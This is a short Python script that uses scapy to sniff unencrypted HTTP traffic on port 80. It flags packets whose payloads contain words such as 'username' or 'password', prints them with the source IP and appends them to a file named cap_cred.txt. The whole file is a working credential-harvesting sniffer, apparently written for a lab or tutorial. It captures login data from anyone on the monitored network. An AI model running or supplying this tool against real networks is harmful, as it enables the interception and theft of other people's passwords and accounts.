from scapy.all import sniff, Raw, IP, TCP_SERVICES

keywords = ["username", "user", "pass", "password", "login"]

def process_packet(packet):
    if packet.haslayer(Raw):

        payload = str(packet[Raw].load)
        
        for word in keywords:
            if word in payload.lower():
               output = f"\n[***] Sensitive Data: {packet[IP].src} -> {payload}\n"
               print(output)
               
               with open("cap_cred.txt", "a") as f:
                   f.write(output)
               break
print("[*] Monitoring For Password... (Try logging into an http site)")
sniff(iface="eth0", filter='tcp port 80', prn=process_packet, store=0)